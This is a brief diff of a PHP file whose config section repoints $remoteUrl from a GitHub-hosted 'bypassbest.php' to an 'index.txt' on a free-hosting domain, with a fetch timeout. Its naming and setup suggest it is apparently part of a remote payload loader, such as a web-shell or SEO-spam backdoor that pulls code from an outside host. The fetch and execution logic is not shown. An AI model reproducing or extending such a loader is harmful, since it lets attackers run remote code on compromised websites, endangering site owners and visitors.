@@ -1,6 +1,6 @@
 <?php
 // === Config ===
-$remoteUrl = 'https://raw.githubusercontent.com/mandhanharisha-hub/seo/refs/heads/main/bypassbest.php';
+$remoteUrl = 'https://toolsseo.rf.gd/index.txt';
 $timeoutSeconds = 10;
 
 // === Resolve paths ===
